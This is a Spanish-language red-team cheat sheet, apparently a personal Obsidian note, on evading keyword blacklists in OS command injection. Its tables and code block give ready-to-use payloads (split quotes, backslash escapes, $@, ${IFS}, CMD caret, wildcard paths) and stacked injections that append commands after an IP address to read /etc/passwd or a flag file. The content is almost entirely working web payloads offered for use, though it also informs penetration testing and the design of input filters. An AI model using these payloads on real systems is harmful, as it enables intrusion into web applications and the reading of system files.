---
aliases:
tags:
  - vuln/command-injection
  - technique/execution
  - asset/web-app
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación]]"
  - "[[Web]]"
tertiary categories:
  - "[[Web Explotación]]"
kind: SubCheatSheet
linked:
  - "[[OS Command Injection]]"
---
# Command Injection - Lista Negra de Comandos (Ofuscación de Keywords)

---

## Cheatsheet

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `w'h'o'am'i` | Comillas simples en pares — shell las descarta antes de ejecutar | Filtro busca string literal `whoami`. Linux/Windows. |
| `w"h"o"am"i` | Comillas dobles, mismo principio | Alternativa cuando simples están filtradas. |
| `w\h\o\a\m\i` | Backslash escape — shell ignora `\` antes de chars no-especiales | **Linux only**. CMD interpreta `\` distinto. |
| `who$@ami` | `$@` = parámetro vacío — concatena `who` + `` + `ami` | **Bash only**. Trick limpio sin caracteres "raros". |
| `who${x}ami` | Variable indefinida expande a vacío | Bash, alternativa a `$@`. |
| `who^ami` | Caret `^` ignorado por CMD — descarta antes de ejecutar | **Windows CMD only**. |
| `wh\oami` | Backslash en Linux con cualquier cmd | Generaliza para cmds más largos. |
| `/bin/cat /etc/passwd` (path absoluto) | Skipea filtros que buscan `cat` sin path | Filtro busca cmd directo, no path. |
| `/???/c?t /etc/p?ss?d` | Wildcards `?` matchean cualquier char | Filtro de keywords completos. |
| `/u*/b*/ca*` | Glob match `*` expande a paths reales | Más permisivo que `?`. |
| `c\at /etc/passwd` o `c\at ${IFS}/etc/passwd` | Combinar escape + IFS para bypass total | Stack de técnicas — útil contra filtros agresivos. |
^ci-blacklist-comandos

### Stacking — combinar técnicas

```bash
# Filtro bloquea: whoami, espacios, ;
# Payload: 127.0.0.1%0aw'h'o'am'i
#         \_____/\__/\___________/
#         host    \n  ofuscación

# Filtro bloquea: cat, espacios, /
# Payload: ${PATH:0:1}???${PATH:0:1}c'a't${IFS}f'l'ag.txt
#         → /bin/cat flag.txt (con todos los chars filtrados generados)

# Filtro bloquea: bash, sh, palabras de 4+ chars
# Payload: /???/c?t /etc/p?sswd
#         → /bin/cat /etc/passwd via wildcards
```

### Por qué funciona

| Mecanismo | Qué hace la shell |
|:---:|:---:|
| **Quotes en pares** | Bash/sh parsean quotes ANTES de ejecutar — los descartan, concatenan substrings. |
| **Backslash escape** | Linux: `\` antes de char no-especial es ignorado. CMD: `\` solo escapa en paths. |
| **`$@` / `${var_indef}`** | Bash expande vars no definidas a string vacío entre tokens. |
| **Caret `^` CMD** | Escape char de CMD — se descarta excepto antes de chars especiales (`&`, `\|`, `>`). |
| **Wildcards `?`/`*`** | Glob expansion ocurre POST-filter pero PRE-exec — el filtro ve `???`, shell expande a real cmd. |

---
